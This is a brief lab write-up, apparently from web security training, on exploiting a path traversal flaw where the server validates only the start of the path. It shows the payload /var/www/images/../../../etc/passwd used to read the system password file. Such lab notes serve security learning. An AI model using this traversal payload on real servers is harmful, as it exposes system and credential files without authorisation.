# Lab 05

## Lab: File path traversal, validation of start of path

**Vulnerable Path:** ../../../etc/passwd

**Step-by-step:**
1. Intercept product
2. FORWARD until get vulnerable parameter (/image?filename=/var/www/images/.jpg)
3. Replace .jpg with ../../../etc/passwd
4. Final: /image?filename=/var/www/images/../../../etc/passwd

![53ba5767a719497085d6dafb96b7ec0d](https://user-images.githubusercontent.com/44063862/106375476-4f006600-63c7-11eb-944a-5cdd806de984.png)
